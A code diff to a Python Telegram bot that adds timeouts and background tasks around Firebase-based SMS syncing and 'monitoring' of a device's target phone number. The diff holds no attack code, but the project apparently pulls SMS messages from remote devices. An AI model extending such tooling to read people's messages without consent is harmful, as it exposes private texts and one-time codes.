@@ -309,7 +309,7 @@ async def _prepare_monitoring(
         target_number=profile.phone_number,
         firebase_url=firebase_url,
     )
-    await sync_profile_to_firebase(profile, device)
+    asyncio.create_task(sync_profile_to_firebase(profile, device))
 
 
 async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -797,14 +797,27 @@ async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             raise ValueError("Pehle device select karo")
         profile, device = resume_monitoring(db, user.id)
         await _prepare_monitoring(db, user.id, profile, device)
-        from app.firebase_sms_sync import snapshot_firebase_sms_seen
+        from app.firebase_sms_sync import (
+            MONITORING_START_SNAPSHOT_SEC,
+            finish_monitoring_baseline,
+            mark_monitoring_baseline_started,
+            snapshot_firebase_sms_seen,
+        )
 
+        mark_monitoring_baseline_started(device, profile, db)
+        ignored = 0
         try:
-            ignored = await snapshot_firebase_sms_seen(profile, device, db)
+            ignored = await asyncio.wait_for(
+                snapshot_firebase_sms_seen(profile, device, db),
+                timeout=MONITORING_START_SNAPSHOT_SEC,
+            )
         except Exception:
-            ignored = 0
+            asyncio.create_task(finish_monitoring_baseline(profile.id, device.id))
         try:
-            _, inject_total_ms = await send_polling_startup_test(db, profile, device)
+            _, inject_total_ms = await asyncio.wait_for(
+                send_polling_startup_test(db, profile, device),
+                timeout=5.0,
+            )
         except Exception:
             inject_total_ms = 15
     except ValueError as exc:
@@ -1252,19 +1265,35 @@ async def _activate_monitoring(
     profile, device = start_monitoring(db, user_id)
     await _prepare_monitoring(db, user_id, profile, device)
 
-    from app.firebase_sms_sync import snapshot_firebase_sms_seen
+    from app.firebase_sms_sync import (
+        MONITORING_START_SNAPSHOT_SEC,
+        finish_monitoring_baseline,
+        mark_monitoring_baseline_started,
+        snapshot_firebase_sms_seen,
+    )
 
+    mark_monitoring_baseline_started(device, profile, db)
+    ignored = 0
     try:
-        ignored = await snapshot_firebase_sms_seen(profile, device, db)
+        ignored = await asyncio.wait_for(
+            snapshot_firebase_sms_seen(profile, device, db),
+            timeout=MONITORING_START_SNAPSHOT_SEC,
+        )
+    except asyncio.TimeoutError:
+        logger.warning("Baseline snapshot slow — continuing in background for %s", device.name)
+        asyncio.create_task(finish_monitoring_baseline(profile.id, device.id))
     except Exception as exc:
         logger.warning("Baseline snapshot failed: %s", exc)
-        ignored = 0
+        asyncio.create_task(finish_monitoring_baseline(profile.id, device.id))
 
+    inject_total_ms = 15
     try:
-        _, inject_total_ms = await send_polling_startup_test(db, profile, device)
+        _, inject_total_ms = await asyncio.wait_for(
+            send_polling_startup_test(db, profile, device),
+            timeout=5.0,
+        )
     except Exception as exc:
         logger.warning("Startup test failed: %s", exc)
-        inject_total_ms = 15
 
     return profile, device, int(ignored), inject_total_ms
 
@@ -1311,7 +1340,13 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
                 return
 
             if device.firebase_source_url:
-                device = await sync_device_from_firebase(db, device)
+                try:
+                    device = await asyncio.wait_for(
+                        sync_device_from_firebase(db, device),
+                        timeout=5.0,
+                    )
+                except asyncio.TimeoutError:
+                    logger.warning("SIM select: Firebase sync timed out for %s", device.name)
             profile = select_sim_slot(db, user.id, int(sim_index))
             db.commit()
             asyncio.create_task(sync_profile_for_user(user.id))
